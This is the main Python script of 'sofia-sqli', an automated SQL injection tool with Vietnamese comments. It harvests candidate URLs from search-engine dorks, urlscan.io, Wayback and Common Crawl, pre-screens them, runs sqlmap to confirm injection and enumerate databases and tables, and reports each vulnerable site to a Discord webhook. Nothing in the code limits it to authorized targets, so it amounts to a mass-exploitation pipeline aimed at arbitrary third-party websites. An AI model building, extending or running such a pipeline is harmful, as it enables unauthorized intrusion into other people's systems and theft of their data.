#!/usr/bin/env python3
"""sofia-sqli - automated SQL injection discovery and verification.

Pipeline (2 tầng song song - producer/consumer)
------------------------------------------------
1. Discovery   - dork Google/Bing/DuckDuckGo + query urlscan.io cho candidates.
2. Persist     - append target moi vao config/targets.txt.
3. Discovery   - chuan hoa target va discover tham so injectable.
4. TANG 1 (scan + check) - pool scan_threads: enrich tham so + heuristic
                pre-screen (error / boolean / time). Target co tin hieu
                duoc day vao queue trung gian (co backpressure).
5. TANG 2 (sqlmap + webhook) - pool exploit_threads: rut target tu queue,
                chay sqlmap detect -> parse -> enumerate tables, luu JSON
                va bao cao Discord webhook NGAY khi co ket qua (khong cho
                ca run ket thuc).
6. Report      - summary Discord embed sau khi ca 2 tang ket thuc.

Cai tien nay giam thoi gian chay dang ke: khi sqlmap dang chay (co the
quanh 600s/target), cac worker scan van tiep tuc quet target moi thay vi
bi chan cho den khi sqlmap xong.

Usage
-----
    python main.py                          # full run from config/settings.yaml
    python main.py --only-verify            # skip dork + urlscan
    python main.py --url "http://x/y.php?id=1"
    python main.py -t config/targets.txt --threads 10
    python main.py --scan-threads 12        # luong pha scan + heuristic
    python main.py --exploit-threads 4      # luong sqlmap song song
    python main.py --queue-size 50          # do lon queue scan->exploit
    python main.py --no-wayback             # skip Wayback CDX discovery
    python main.py --no-commoncrawl         # skip Common Crawl discovery
    python main.py --no-rank                # keep targets.txt order (no ranking)
    python main.py --no-report              # never touch Discord
    python main.py --dry-run                # scan + check only, no sqlmap
    python main.py --dork-stats             # dork dictionary + evolution stats
    python main.py --dork-preview 5         # sample generated dorks per engine
    python main.py --dork-pending           # human-approve queue
    python main.py --dork-approve all       # approve learned words
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import queue
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field

import yaml
import requests
from requests.adapters import HTTPAdapter

try:  # urllib3 >= 2 / 1.26 compat
    from urllib3.util.retry import Retry
except ImportError:  # pragma: no cover
    Retry = None  # type: ignore[assignment]

# Ensure project root importable when invoked from elsewhere.
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.crawler import DorkCrawler, smart_dedupe_urls
from core.dork_dict import DorkDictionary
from core.dork_evolution import DorkEvolution
from core.dork_adapter import to_engine
from core.param_discovery import (
    Target,
    dedupe_targets,
    enrich_target,
    load_targets_from_file,
    parse_target_line,
    rank_targets,
    targets_from_urls,
)
from core.sqli_detector import HeuristicDetector
from core.exploit import SqlmapExploiter
from core.parser import Finding, SqlmapParser
from core.reporter import DiscordReporter
from utils.logger import get_logger, setup_logger

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
_file_lock = threading.Lock()
log = get_logger("sofia-sqli.main")


@dataclass
class Context:
    """Shared, thread-safe-ish pipeline context."""

    settings: dict
    detector: HeuristicDetector
    exploiter: SqlmapExploiter
    parser: SqlmapParser
    reporter: DiscordReporter
    dry_run: bool = False
    no_report: bool = False
    require_heuristic: bool = True
    enumerate_tables: bool = True
    session: requests.Session = field(default_factory=requests.Session)


# --------------------------------------------------------------------- config
def load_settings(path: str) -> dict:
    try:
        with open(path, "r", encoding="utf-8") as fh:
            cfg = yaml.safe_load(fh) or {}
    except FileNotFoundError:
        print(f"[!] settings file not found: {path}", file=sys.stderr)
        sys.exit(2)
    except yaml.YAMLError as exc:
        print(f"[!] invalid YAML in {path}: {exc}", file=sys.stderr)
        sys.exit(2)

    # Environment overrides.
    if os.environ.get("SOFIA_THREADS"):
        cfg.setdefault("general", {})["threads"] = int(os.environ["SOFIA_THREADS"])
    return cfg


# ----------------------------------------------------------- dork management
def dork_management(args, settings: dict) -> bool:
    """Handle the dork-dictionary management subcommands.

    Returns True when one of --dork-* management flags was given (caller
    should exit). These commands never touch the network.
    """
    wants = (args.dork_pending or args.dork_approve or args.dork_reject
             or args.dork_stats or args.dork_preview)
    if not wants:
        return False

    dork_cfg = settings.get("dork", {}) or {}
    dict_cfg = dork_cfg.get("dictionary", {}) or {}
    if not dict_cfg.get("enabled", False):
        print("[!] dork.dictionary.enabled = false trong settings.yaml - "
              "bat len de dung cac lenh --dork-*")
        return True

    dd = DorkDictionary(dict_cfg, base_dir=BASE_DIR)
    evo: DorkEvolution | None = None
    evo_cfg = dork_cfg.get("evolution", {}) or {}
    if evo_cfg.get("enabled", False):
        evo = DorkEvolution(dd, evo_cfg, base_dir=BASE_DIR)

    if args.dork_stats:
        print("== Tu dien dork ==")
        stats = dd.stats()
        for tier in ("vertical", "script", "param", "ext", "tld"):
            s = stats.get(tier)
            if not s:
                continue
            hot = ", ".join(f"{e.word}({e.hits})" for e in s["hot"])
            print(f"  {tier:<9}: {s['total']:>4} tu ({s['learned']} tu hoc) "
                  f"| hot: {hot}")
        print(f"  languages: {', '.join(dd.languages)}")
        print(f"  pending queue: {dd.pending_total()} cho duyet "
              f"(file: {dd.pending_file})")
        print(f"  learned file : {dd.learned_file}")
        if evo:
            print(evo.report())

    if args.dork_preview:
        qs = dd.generate(max(1, args.dork_preview))
        print(f"== {len(qs)} dork mau (dictionary combination) ==")
        for q in qs:
            print(f"  canonical : {q}")
            print(f"    google  : {q}")
            print(f"    bing    : {to_engine(q, 'bing')}")
            print(f"    yandex  : {to_engine(q, 'yandex')}")
            print(f"    urlscan : {to_engine(q, 'urlscan')}")

    if args.dork_pending:
        flat = dd.pending_flat()
        if not flat:
            print("(hang doi duyet trong)")
        else:
            print(f"== {len(flat)} tu cho duyet ==")
            for i, (tier, item) in enumerate(flat):
                ex = (item.get("examples") or [])[0:1]
                print(f"  [{i:>3}] {tier:<8} {item.get('word', ''):<28} "
                      f"count={item.get('count', 0):<4} "
                      f"vd: {ex[0][:80] if ex else '-'}")
            print("Duyet:  python main.py --dork-approve <i1> <i2> ... | all")
            print("Loai bo: python main.py --dork-reject <i1> ... | all")

    if args.dork_approve:
        tokens = [t for t in args.dork_approve.split() if t]
        if tokens == ["all"]:
            n = dd.approve(all_pending=True)
        else:
            try:
                idx = [int(t) for t in tokens]
            except ValueError:
                print("[!] cu phap: --dork-approve all | --dork-approve 0 1 2")
                return True
            n = dd.approve(indices=idx)
        dd.save_state()
        print(f"[+] da duyet {n} tu -> them vao tu dien tu hoc "
              f"({dd.learned_file})")

    if args.dork_reject:
        tokens = [t for t in args.dork_reject.split() if t]
        if tokens == ["all"]:
            n = dd.reject(all_pending=True)
        else:
            try:
                idx = [int(t) for t in tokens]
            except ValueError:
                print("[!] cu phap: --dork-reject all | --dork-reject 0 1 2")
                return True
            n = dd.reject(indices=idx)
        print(f"[-] da loai bo {n} tu khoi hang doi duyet")

    return True


# -------------------------------------------------------------------- targets
def persist_targets(path: str, new_targets: list[Target]) -> int:
    """Append newly discovered targets to the targets file (deduped)."""
    existing: set[str] = set()
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                t = parse_target_line(line)
                if t:
                    existing.add(t.as_line())

    to_add: list[str] = []
    for tgt in new_targets:
        line = tgt.as_line()
        if line not in existing:
            existing.add(line)
            to_add.append(line)

    if not to_add:
        return 0

    with open(path, "a", encoding="utf-8") as fh:
        fh.write("\n# --- discovered by sofia-sqli "
                 f"({time.strftime('%Y-%m-%d %H:%M:%S')}) ---\n")
        fh.write("\n".join(to_add) + "\n")
    return len(to_add)


def build_targets(args, ctx: Context, crawl_targets: list[Target]) -> list[Target]:
    targets: list[Target] = []

    # File targets.
    file_targets = load_targets_from_file(args.targets)
    targets.extend(file_targets)

    # Crawler targets.
    targets.extend(crawl_targets)

    # Ad-hoc CLI target.
    if args.url:
        tgt = parse_target_line(args.url)
        if tgt:
            if args.data:
                tgt.method = "POST"
                tgt.data = args.data
                # Re-derive params now that a POST body exists.
                tgt.params = [k for k, _ in tgt.param_pairs()]
            targets.append(tgt)
        else:
            print(f"[!] could not parse --url value: {args.url}", file=sys.stderr)

    targets = dedupe_targets(targets)

    # Rank targets so the most SQLi-promising ones are processed (and kept
    # after the max_targets cut) first. Disable via --no-rank or settings.
    if (bool(ctx.settings.get("general", {}).get("rank_targets", True))
            and not args.no_rank):
        targets = rank_targets(targets)
        if targets:
            log.info("Targets ranked by SQLi promise "
                     "(top score %d: %s)", targets[0].score, targets[0].url)

    max_targets = int(ctx.settings.get("general", {}).get("max_targets", 0) or 0)
    if max_targets and len(targets) > max_targets:
        log.info("Limiting to %d targets (max_targets)", max_targets)
        targets = targets[:max_targets]
    return targets


# ------------------------------------------------------------------- pipeline
@dataclass
class ScanResult:
    """Ket qua tang scan (producer): target da qua heuristic pre-screen."""

    target: Target
    heuristic_reason: str = ""


def scan_target(target: Target, ctx: Context) -> ScanResult | None:
    """TANG 1 - scan + check: enrich tham so + heuristic pre-screen.

    Chi lam phan nhanh (HTTP probe), KHONG chay sqlmap. Tra ve ScanResult
    khi target co tin hieu (hoac khi heuristic bi tat), None khi bo qua.
    """
    log.info("=== Target: %s [%s] ===", target.url, target.method)

    # 3. Parameter discovery (config: param_discovery trong settings.yaml).
    pd_cfg = dict(ctx.settings.get("param_discovery", {}) or {})
    gen_timeout = float(ctx.settings.get("general", {}).get("timeout", 20))
    # crawl_timeout = 0 -> dung general.timeout.
    crawl_timeout = float(pd_cfg.get("crawl_timeout", 0) or 0) or gen_timeout
    enrich_target(target, session=ctx.session, timeout=crawl_timeout, cfg=pd_cfg)
    if not target.params:
        log.info("No parameters found for %s - skipped", target.url)
        return None
    log.info("Candidate params: %s", ", ".join(target.params[:12]))

    if ctx.dry_run:
        log.info("[dry-run] would run sqlmap on %s", target.url)
        return None

    # 4. Heuristic pre-screen.
    if ctx.require_heuristic:
        det = ctx.detector.check(target)
        heuristic_reason = det.best_reason()
        if not det.hit and not det.blocked:
            log.info("No heuristic signal for %s (%s) - skipped before sqlmap",
                     target.url, heuristic_reason)
            return None
        log.info("Heuristic signal for %s: %s", target.url, heuristic_reason)
        return ScanResult(target=target, heuristic_reason=heuristic_reason)

    # require_heuristic = false (--force-sqlmap): day moi target vao tang sqlmap.
    return ScanResult(target=target, heuristic_reason="")


def exploit_target(item: ScanResult, ctx: Context) -> Finding | None:
    """TANG 2 - sqlmap + webhook: verify, enumerate tables, luu ket qua.

    Chay trong pool exploit_threads rieng, nhan ScanResult tu queue.
    Bao cao webhook duoc thuc hien boi run_pipeline ngay sau khi finding
    san sang (khong cho ca run ket thuc).
    """
    target = item.target

    if not ctx.exploiter.available():
        log.error("sqlmap unavailable - cannot verify %s", target.url)
        return None

    # 5a. sqlmap verification + database enumeration.
    run = ctx.exploiter.run(target, phase="detect")
    finding = ctx.parser.parse_run(run, target)
    finding.heuristic_reason = item.heuristic_reason

    if not finding.vulnerable:
        log.info("sqlmap: %s NOT injectable", target.url)
        return finding

    log.info("CONFIRMED injection on %s: %s", target.domain, finding.dbms_display())

    # 5b. Table enumeration for the report's "3 tables" field.
    if ctx.enumerate_tables and not finding.top_tables(3):
        dbs = finding.non_system_databases() or finding.databases
        target_dbs = [finding.current_db] if finding.current_db else dbs
        # Fall back to the current database (or None = sqlmap default) when the
        # DBMS exposes no database list (e.g. SQLite).
        if not any(target_dbs):
            target_dbs = [None]
        for db in target_dbs[:2]:
            log.info("Enumerating tables of database '%s'", db or "(current)")
            trun = ctx.exploiter.run(target, phase="tables", database=db)
            tfinding = ctx.parser.parse_run(trun, target)
            finding.tables_by_db.update(tfinding.tables_by_db)
            finding.evidence_files.extend(
                f for f in tfinding.evidence_files if f not in finding.evidence_files)
            if finding.top_tables(3):
                break

    return finding


def process_target(target: Target, ctx: Context) -> Finding | None:
    """Chay tuan tu scan -> exploit tren 1 target (tuong thich cu / tiengọi).

    Pipeline song song moi dung run_pipeline(); ham nay giu lai de test
    don le mot target ma khong can dung queue.
    """
    item = scan_target(target, ctx)
    if item is None:
        return None
    return exploit_target(item, ctx)


def _pipeline_thread_counts(args, settings: dict) -> tuple[int, int, int]:
    """Giai ma so luong cho 2 tang pipeline tu CLI + settings.yaml."""
    gen = settings.get("general", {}) or {}
    base = max(1, int(gen.get("threads", 5) or 5))
    scan_threads = int(getattr(args, "scan_threads", 0) or 0) \
        or int(gen.get("scan_threads", base) or base)
    exploit_threads = int(getattr(args, "exploit_threads", 0) or 0) \
        or int(gen.get("exploit_threads", base) or base)
    queue_size = int(getattr(args, "queue_size", 0) or 0) \
        or int(gen.get("queue_maxsize", max(8, exploit_threads * 4))
               or max(8, exploit_threads * 4))
    return max(1, scan_threads), max(1, exploit_threads), max(1, queue_size)


def run_pipeline(targets: list[Target], ctx: Context, args,
                 output_dir: str) -> tuple[list[Finding], list[Finding], float, float]:
    """Pipeline 2 tang song song (producer/consumer).

    * Tang 1 "scan" (ThreadPoolExecutor, scan_threads): enrich + heuristic.
      Target qua pre-screen duoc day vao ``queue.Queue`` gioi han - khi queue
      day, worker scan se block (backpressure) nen khong tran bo nho va
      ngan sach sqlmap van duoc kiem soat.
    * Tang 2 "exploit" (thread thuong, exploit_threads): rut tu queue, chay
      sqlmap detect -> tables, luu JSON va bao cao webhook ngay tai cho.

    Tra ve (findings, vuln, started, ended) de main() tong ket.
    """
    scan_threads, exploit_threads, queue_size = _pipeline_thread_counts(
        args, ctx.settings)
    log.info("Pipeline: scan_threads=%d exploit_threads=%d queue_maxsize=%d",
             scan_threads, exploit_threads, queue_size)

    started = time.time()
    findings: list[Finding] = []
    vuln: list[Finding] = []
    results_lock = threading.Lock()

    run_exploit = exploit_threads > 0 and not ctx.dry_run
    work: queue.Queue = queue.Queue(maxsize=queue_size)
    _SENTINEL = object()  # tin hieu ket thuc cho moi exploit worker

    def _record(finding: Finding) -> None:
        """Luu JSON + dem + in [VULN] (khu vuc giam sat thread-safe)."""
        with results_lock:
            findings.append(finding)
            save_result(finding, output_dir)
            if finding.vulnerable:
                vuln.append(finding)
        if finding.vulnerable:
            print(f"\n[VULN] {finding.report_line()}\n")

    # ------------------------------------------------- Tang 2: exploit pool
    exploit_workers: list[threading.Thread] = []
    if run_exploit:
        def _exploit_worker() -> None:
            while True:
                try:
                    item = work.get()
                except (queue.Empty, KeyboardInterrupt):  # pragma: no cover
                    return
                try:
                    if item is _SENTINEL:
                        return
                    try:
                        finding = exploit_target(item, ctx)
                    except Exception as exc:  # noqa: BLE001 - isolate per target
                        log.error("Exploit %s crashed: %s", item.target.url, exc,
                                  exc_info=True)
                        continue
                    if finding is None:
                        continue
                    _record(finding)
                    # Bao cao webhook NGAY khi co ket qua (song song voi scan).
                    if finding.vulnerable and not ctx.no_report:
                        ctx.reporter.send_finding(finding)
                finally:
                    work.task_done()

        exploit_workers = [
            threading.Thread(target=_exploit_worker, name=f"exploit-{i}",
                             daemon=True)
            for i in range(exploit_threads)
        ]
        for th in exploit_workers:
            th.start()

    # -------------------------------------------------- Tang 1: scan pool
    def _scan_and_enqueue(target: Target) -> None:
        item = scan_target(target, ctx)
        if item is not None and run_exploit:
            # put() block khi queue day -> backpressure tu nhien.
            work.put(item)

    crashed = 0
    with ThreadPoolExecutor(max_workers=scan_threads,
                            thread_name_prefix="scan") as spool:
        futures = {spool.submit(_scan_and_enqueue, t): t for t in targets}
        for fut in as_completed(futures):
            tgt = futures[fut]
            try:
                fut.result()
            except Exception as exc:  # noqa: BLE001
                crashed += 1
                log.error("Scan %s crashed: %s", tgt.url, exc, exc_info=True)

    # -------------------------------------------------- Ket thuc tang 2
    # Scan da xong: moi exploit worker 1 sentinel de no ket thuc sau khi
    # xoa het phan ton lai trong queue.
    for _ in exploit_workers:
        work.put(_SENTINEL)
    for th in exploit_workers:
        th.join()

    if crashed:
        log.warning("%d target(s) crashed during scan phase", crashed)
    ended = time.time()
    return findings, vuln, started, ended


def save_result(finding: Finding, output_dir: str) -> str:
    os.makedirs(output_dir, exist_ok=True)
    name = "".join(c if c.isalnum() or c in "._-" else "_" for c in finding.domain) or "target"
    # Include a short, stable hash of the full request so distinct targets that
    # share a host never overwrite each other's evidence file.
    sig = f"{finding.target.method}:{finding.target.url}:{finding.target.data}"
    digest = hashlib.sha1(sig.encode("utf-8")).hexdigest()[:6]
    path = os.path.join(output_dir, f"{name}_{digest}_finding.json")
    data = {
        "domain": finding.domain,
        "url": finding.target.url,
        "method": finding.target.method,
        "vulnerable": finding.vulnerable,
        "dbms": finding.dbms,
        "dbms_version": finding.dbms_version,
        "dbms_display": finding.dbms_display(),
        "os": finding.os,
        "web_app": finding.web_app,
        "current_db": finding.current_db,
        "current_user": finding.current_user,
        "databases": finding.databases,
        "tables": finding.top_tables(3),
        "tables_by_db": finding.tables_by_db,
        "injection_location": finding.injection_location(),
        "injection_points": [
            {"parameter": p.parameter, "place": p.place,
             "techniques": p.technique_summary, "payloads": p.payloads}
            for p in finding.injection_points
        ],
        "payloads": finding.payloads,
        "report_line": finding.report_line(),
        "heuristic_reason": finding.heuristic_reason,
        "note": finding.note,
        "evidence_files": finding.evidence_files,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
    }
    with _file_lock:
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2, ensure_ascii=False)
    return path


def _make_urllib3_retries(settings: dict):
    """Transport-level retry for connection/reset errors (status retries are
    handled at the application layer so 429/503 can back off with jitter)."""
    if Retry is None:
        return 0
    retries = int(settings.get("general", {}).get("retries", 3) or 3)
    try:
        return Retry(total=retries, connect=retries, read=retries,
                     status=0, backoff_factor=0.5,
                     allowed_methods=None)  # retry on any method (idempotent GETs)
    except TypeError:  # older urllib3 without allowed_methods
        return Retry(total=retries, connect=retries, read=retries,
                     status=0, backoff_factor=0.5)


# ----------------------------------------------------------------------- main
def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="sofia-sqli",
        description="Automated SQLi discovery (dork + urlscan.io) and sqlmap verification.",
    )
    p.add_argument("-c", "--config", default=os.path.join(BASE_DIR, "config", "settings.yaml"),
                   help="Path to settings.yaml")
    p.add_argument("-t", "--targets", default=os.path.join(BASE_DIR, "config", "targets.txt"),
                   help="Path to targets.txt")
    p.add_argument("--url", help="Ad-hoc single target URL (overrides/extends file)")
    p.add_argument("--data", help="POST body for --url (k=v&k2=v2)")
    p.add_argument("--threads", type=int, help="Override worker thread count")
    p.add_argument("--scan-threads", type=int, metavar="N",
                   help="So luong tang 1 (scan + heuristic) chay song song")
    p.add_argument("--exploit-threads", type=int, metavar="N",
                   help="So luong tang 2 (sqlmap) chay song song")
    p.add_argument("--queue-size", type=int, metavar="N",
                   help="Do lon queue trung gian scan -> sqlmap (backpressure)")
    p.add_argument("--webhook", help="Override Discord webhook URL")
    p.add_argument("--only-verify", action="store_true",
                   help="Skip dork + urlscan; verify only existing targets")
    p.add_argument("--no-dork", action="store_true", help="Skip dork search only")
    p.add_argument("--no-urlscan", action="store_true", help="Skip urlscan.io only")
    p.add_argument("--no-wayback", action="store_true",
                   help="Skip Wayback Machine CDX discovery")
    p.add_argument("--no-commoncrawl", action="store_true",
                   help="Skip Common Crawl discovery")
    p.add_argument("--no-rank", action="store_true",
                   help="Do not rank targets (keep targets.txt order)")
    p.add_argument("--no-smart-dedupe", action="store_true",
                   help="Keep value-variant duplicates of the same endpoint")
    p.add_argument("--force-sqlmap", action="store_true",
                   help="Run sqlmap even without a heuristic signal")
    p.add_argument("--no-tables", action="store_true", help="Do not enumerate tables")
    p.add_argument("--no-report", action="store_true", help="Never post to Discord")
    p.add_argument("--dork-stats", action="store_true",
                   help="Show dork-dictionary + evolution stats and exit")
    p.add_argument("--dork-preview", type=int, metavar="N", default=0,
                   help="Generate N sample dorks (per-engine syntax) and exit")
    p.add_argument("--dork-pending", action="store_true",
                   help="List the human-approve queue of learned words and exit")
    p.add_argument("--dork-approve", metavar="IDX",
                   help="Approve pending words: 'all' or space-separated indices")
    p.add_argument("--dork-reject", metavar="IDX",
                   help="Reject pending words: 'all' or space-separated indices")
    p.add_argument("--dry-run", action="store_true", help="Discovery only, no sqlmap")
    p.add_argument("-v", "--verbose", action="store_true", help="DEBUG logging")
    return p.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    settings = load_settings(args.config)

    log_cfg = settings.get("logging", {}) or {}
    level = "DEBUG" if args.verbose else log_cfg.get("level", "INFO")
    log_file = log_cfg.get("file")
    if log_file and not os.path.isabs(log_file):
        log_file = os.path.join(BASE_DIR, log_file)
    setup_logger(level=level, log_file=log_file)

    # Dork-dictionary management subcommands never touch the network.
    if dork_management(args, settings):
        return 0

    if args.webhook:
        settings.setdefault("discord", {})["webhook_url"] = args.webhook
    if args.threads:
        settings.setdefault("general", {})["threads"] = args.threads

    output_dir = settings.get("general", {}).get("output_dir", "results")
    if not os.path.isabs(output_dir):
        output_dir = os.path.join(BASE_DIR, output_dir)

    session = requests.Session()
    # Connection pooling: the shared session is used concurrently by many
    # worker threads; a small default HTTPAdapter pool serialises connections
    # and causes spurious timeouts under load.
    _threads_cfg = int(settings.get("general", {}).get("threads", 5) or 5)
    _disc_cfg = int(settings.get("general", {}).get("discovery_threads",
                                                   _threads_cfg) or _threads_cfg)
    _pool = max(10, _threads_cfg + _disc_cfg)
    pool_adapter = HTTPAdapter(pool_connections=_pool, pool_maxsize=_pool * 2,
                               max_retries=_make_urllib3_retries(settings))
    session.mount("http://", pool_adapter)
    session.mount("https://", pool_adapter)

    ctx = Context(
        settings=settings,
        detector=HeuristicDetector(settings, session=session),
        exploiter=SqlmapExploiter(settings, output_dir=output_dir),
        parser=SqlmapParser(),
        reporter=DiscordReporter(settings, session=session),
        dry_run=args.dry_run,
        no_report=args.no_report,
        require_heuristic=not args.force_sqlmap,
        enumerate_tables=not args.no_tables,
        session=session,
    )

    # ---------------------------------------------------------- 1. Discovery
    # Each source (dork/urlscan/wayback/commoncrawl) runs in its own thread
    # with its own rate limiter, and a crash in one source can never take
    # down the whole run. Sources can still be disabled individually.
    crawl_targets: list[Target] = []
    if not args.only_verify:
        crawler = DorkCrawler(settings, session=session)
        sources: list[tuple[str, object]] = []
        if not args.no_dork:
            sources.append(("dork", crawler.run_dorks))
        if not args.no_urlscan:
            sources.append(("urlscan", crawler.run_urlscan))
        if not args.no_wayback:
            sources.append(("wayback", crawler.run_wayback))
        if not args.no_commoncrawl:
            sources.append(("commoncrawl", crawler.run_commoncrawl))

        def _run_source(name: str, fn) -> list[str]:
            try:
                return list(fn().urls)
            except Exception as exc:  # noqa: BLE001 - isolate source failures
                log.error("Discovery source '%s' crashed (isolated): %s", name, exc,
                          exc_info=args.verbose)
                return []

        if not sources:
            log.warning("All discovery sources disabled - relying on targets.txt only")
            unique = []
        elif len(sources) == 1:
            name, fn = sources[0]
            unique = _run_source(name, fn)
        else:
            with ThreadPoolExecutor(max_workers=len(sources),
                                    thread_name_prefix="disc") as dpool:
                futs = {dpool.submit(_run_source, n, fn): n for n, fn in sources}
                disc: list[str] = []
                for fut in as_completed(futs):
                    disc.extend(fut.result())
            # Global dedupe.
            seen: set[str] = set()
            unique = []
            for u in disc:
                if u not in seen:
                    seen.add(u)
                    unique.append(u)

        # Collapse value-only variants (id=1 vs id=2 of the same endpoint) so
        # the sqlmap budget is spent on distinct sinks. Toggleable in settings.
        if (unique
                and bool(settings.get("general", {}).get("smart_dedupe", True))
                and not args.no_smart_dedupe):
            before = len(unique)
            unique = smart_dedupe_urls(unique)
            if before != len(unique):
                log.info("smart-dedupe: %d candidates -> %d unique sinks",
                         before, len(unique))

        # Feedback loop: feed harvested URLs into the dictionary learning
        # loop and advance the dork evolution one generation (once per run).
        crawler.observe_feedback(unique)

        crawl_targets = targets_from_urls(unique, source="crawler")

        # ------------------------------------------------- 2. Persist targets
        if crawl_targets and not args.dry_run:
            added = persist_targets(args.targets, crawl_targets)
            log.info("Persisted %d new targets to %s", added, args.targets)

    # ------------------------------------------------------ 3. Build targets
    targets = build_targets(args, ctx, crawl_targets)
    if not targets:
        log.warning("No targets to process. Add URLs to %s or enable dork/urlscan.",
                    args.targets)
        if ctx.reporter.enabled and not ctx.no_report:
            ctx.reporter.send_text("sofia-sqli: no targets to process.")
        return 1

    scan_threads, exploit_threads, queue_size = _pipeline_thread_counts(args, settings)
    log.info("Processing %d target(s): scan_threads=%d exploit_threads=%d "
             "queue_maxsize=%d", len(targets), scan_threads, exploit_threads,
             queue_size)

    # --------------------------------------------- 4-6. Pipeline song song
    # Tang 1 (scan + heuristic) va tang 2 (sqlmap + webhook) chay dong thoi:
    # target co tin hieu duoc day vao queue ngay khi scan xong, exploit pool
    # rut ra chay sqlmap va bao cao webhook ngay khi co ket qua.
    findings, vuln, started, ended = run_pipeline(targets, ctx, args, output_dir)

    # ------------------------------------------------------------ summary
    log.info("Run complete: %d scanned, %d vulnerable, %.1fs",
             len(findings), len(vuln), ended - started)
    if vuln:
        print("\n===== SUMMARY (Domain | DBMS+version | Tables | Location) =====")
        for f in vuln:
            print(f.report_line())
        print("=============================================================")

    if not args.no_report and not ctx.dry_run and ctx.reporter.enabled:
        ctx.reporter.send_summary(len(findings), vuln, started, ended)

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\n[!] interrupted by user", file=sys.stderr)
        raise SystemExit(130)
